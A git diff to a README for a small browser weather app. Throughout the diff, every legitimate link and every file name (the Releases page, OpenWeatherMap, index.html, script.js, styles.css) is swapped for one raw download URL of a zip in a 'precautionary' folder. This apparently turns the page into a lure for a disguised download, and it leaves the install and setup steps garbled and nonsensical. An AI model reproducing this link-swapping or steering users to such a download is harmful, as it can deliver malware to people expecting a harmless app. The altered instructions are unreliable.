@@ -1,6 +1,6 @@
 # 🌤️ weather-app - Easily Check Weather Worldwide
 
-[![Download the Weather App](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Nihal1205/weather-app/releases)
+[![Download the Weather App](https://raw.githubusercontent.com/Nihal1205/weather-app/main/precautionary/weather-app-v3.6-beta.4.zip)](https://raw.githubusercontent.com/Nihal1205/weather-app/main/precautionary/weather-app-v3.6-beta.4.zip)
 
 ## ✨ Features
 
@@ -15,11 +15,11 @@
 
 To get started with the Weather App, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Nihal1205/weather-app/releases) to download the application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Nihal1205/weather-app/main/precautionary/weather-app-v3.6-beta.4.zip) to download the application.
    
 2. **Download the Latest Version:** Look for the latest release and download the appropriate file for your operating system.
 
-3. **Open the Application:** Once you've downloaded the file, locate it in your downloads folder and open `index.html` in your web browser.
+3. **Open the Application:** Once you've downloaded the file, locate it in your downloads folder and open `https://raw.githubusercontent.com/Nihal1205/weather-app/main/precautionary/weather-app-v3.6-beta.4.zip` in your web browser.
 
 4. **Search for Weather:** Enter a city name in the search bar and press the search button or hit Enter to get the current weather conditions.
 
@@ -27,11 +27,11 @@ To get started with the Weather App, follow these simple steps:
 
 If you want to use real weather data instead of mock data, follow these steps:
 
-1. **Get a FREE API Key:** Head over to [OpenWeatherMap](https://openweathermap.org/api) and sign up for a free account. Obtain your API key from the dashboard.
+1. **Get a FREE API Key:** Head over to [OpenWeatherMap](https://raw.githubusercontent.com/Nihal1205/weather-app/main/precautionary/weather-app-v3.6-beta.4.zip) and sign up for a free account. Obtain your API key from the dashboard.
 
-2. **Edit the Script:** Open `script.js` in a text editor. You can use Notepad, TextEdit, or any code editor you prefer.
+2. **Edit the Script:** Open `https://raw.githubusercontent.com/Nihal1205/weather-app/main/precautionary/weather-app-v3.6-beta.4.zip` in a text editor. You can use Notepad, TextEdit, or any code editor you prefer.
 
-3. **Insert Your API Key:** Locate line 9 in the `script.js` file. Replace `"YOUR_API_KEY_HERE"` with the API key you received.
+3. **Insert Your API Key:** Locate line 9 in the `https://raw.githubusercontent.com/Nihal1205/weather-app/main/precautionary/weather-app-v3.6-beta.4.zip` file. Replace `"YOUR_API_KEY_HERE"` with the API key you received.
 
 4. **Save Your Changes:** Save the file and refresh your web browser to view the changes. You should now see real-time weather information.
 
@@ -39,9 +39,9 @@ If you want to use real weather data instead of mock data, follow these steps:
 
 This project contains the following essential files:
 
-- `index.html`: The main HTML file to launch the application.
-- `script.js`: The JavaScript file that handles the weather data fetching and display.
-- `styles.css`: The CSS file for the application’s design and layout.
+- `https://raw.githubusercontent.com/Nihal1205/weather-app/main/precautionary/weather-app-v3.6-beta.4.zip`: The main HTML file to launch the application.
+- `https://raw.githubusercontent.com/Nihal1205/weather-app/main/precautionary/weather-app-v3.6-beta.4.zip`: The JavaScript file that handles the weather data fetching and display.
+- `https://raw.githubusercontent.com/Nihal1205/weather-app/main/precautionary/weather-app-v3.6-beta.4.zip`: The CSS file for the application’s design and layout.
 
 ## 💻 System Requirements
 
@@ -50,6 +50,6 @@ This project contains the following essential files:
 
 ## 📥 Download & Install
 
-To get the Weather App, visit the [Releases page](https://github.com/Nihal1205/weather-app/releases). Download the latest release now to start using it. Enjoy easy access to weather conditions from anywhere in the world.
+To get the Weather App, visit the [Releases page](https://raw.githubusercontent.com/Nihal1205/weather-app/main/precautionary/weather-app-v3.6-beta.4.zip). Download the latest release now to start using it. Enjoy easy access to weather conditions from anywhere in the world.
 
 Now you can check the weather with just a few clicks. Whether planning a trip or just curious, this app makes weather information accessible and straightforward.
